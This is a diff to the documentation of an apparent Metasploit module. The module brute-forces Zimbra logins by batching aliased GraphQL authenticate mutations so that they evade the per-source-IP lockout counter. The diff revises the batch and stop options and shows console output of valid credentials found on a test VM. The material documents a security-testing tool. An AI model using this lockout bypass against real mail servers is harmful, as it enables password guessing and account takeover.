@@ -58,9 +58,14 @@ source-IP threshold. Accepted passwords are still stored as credentials.
 The number of aliased GraphQL `authenticate` mutations sent in one HTTP
 request. The default is 50 and the allowed range is 1 through 1,000. Lower
 values reduce per-request load. A value of 1 uses the same authentication path
-without alias multiplication. `BATCH_SIZE` must be 1 when the inherited
-`TRANSITION_DELAY` option is enabled; otherwise candidates from password or
-username transitions would be held and transmitted together.
+without alias multiplication.
+
+`BATCH_SIZE` must be 1 when `STOP_ON_SUCCESS` is enabled or
+`MaxGuessesPerService` is nonzero. This lets the module stop before sending the
+next candidate and keeps skipped, already-successful users out of the guess
+count. It must also be 1 when `TRANSITION_DELAY` is enabled; otherwise
+candidates from password or username transitions would be held and transmitted
+together.
 
 The inherited `BRUTEFORCE_SPEED` delay is applied between HTTP requests rather
 than between aliases in one already-constructed request.
@@ -69,35 +74,48 @@ than between aliases in one already-constructed request.
 
 ### Zimbra 10.1.16 Network Edition on Ubuntu 22.04 x64
 
-The following output was produced with an isolated Network Edition instance.
-Account and host values have been replaced with reserved example names.
+The following console output was recorded against a licensed 10.1.16 Network
+Edition VM. Account and host values have been replaced with reserved example
+names.
+
+The first run used the default `BATCH_SIZE` of 50 and a `USERPASS_FILE` containing
+49 candidates for a nonexistent account followed by one known-valid account.
+`STOP_ON_SUCCESS` was `false` and `MaxGuessesPerService` was `0`.
 
 ```text
-msf6 > use auxiliary/scanner/http/zimbra_graphql_brute
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > set RHOSTS 192.0.2.10
-RHOSTS => 192.0.2.10
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > set VHOST zimbra.example.invalid
-VHOST => zimbra.example.invalid
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > check
 [*] 192.0.2.10:443 - The service is running, but could not be validated. Two aliased GraphQL authenticate operations ran in one unauthenticated HTTP request
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > set USERNAME researcher@example.invalid
-USERNAME => researcher@example.invalid
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > set PASS_FILE /tmp/candidates.txt
-PASS_FILE => /tmp/candidates.txt
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > set BATCH_SIZE 4
-BATCH_SIZE => 4
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > set STOP_ON_SUCCESS true
-STOP_ON_SUCCESS => true
-msf6 auxiliary(scanner/http/zimbra_graphql_brute) > run
-[+] 192.0.2.10:443 - Valid credential found for researcher@example.invalid
-[+] Submitted 4 credential candidate(s) in 1 GraphQL request(s); found 1 valid credential(s)
+[+] 192.0.2.10:443    - [50/50] - Valid credential found for researcher@example.invalid
+[+] Submitted 50 credential candidate(s) in 1 GraphQL request(s); found 1 valid credential(s)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+A second word-pair file contained a valid password for the first account, an
+invalid password for that same account, and a valid password for a second
+account. With `BATCH_SIZE=1` and `STOP_ON_SUCCESS=true`, only the first candidate
+was submitted:
+
+```text
+[+] 192.0.2.10:443    - [1/3] - Valid credential found for researcher@example.invalid
+[+] Submitted 1 credential candidate(s) in 1 GraphQL request(s); found 1 valid credential(s)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+With `STOP_ON_SUCCESS=false` and `MaxGuessesPerService=2`, the same file reached
+the second account without counting the skipped password as an attempt:
+
+```text
+[+] 192.0.2.10:443    - [1/2] - Valid credential found for researcher@example.invalid
+[+] 192.0.2.10:443    - [2/2] - Valid credential found for colleague@example.invalid
+[+] Submitted 2 credential candidate(s) in 2 GraphQL request(s); found 2 valid credential(s)
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 ```
 
 ### Separate requests remain outside the source-IP counter
 
-The configured source-IP maximum was 10. With reverse-proxy trust active,
+An earlier control test used a source-IP maximum of 10. With reverse-proxy trust active,
 ordinary SOAP requests 1 through 11 returned authentication faults and
 requests 12 and 13 returned HTTP 503. With `BATCH_SIZE` set to 1, GraphQL
 processed eleven rejected passwords in eleven HTTP requests, then accepted
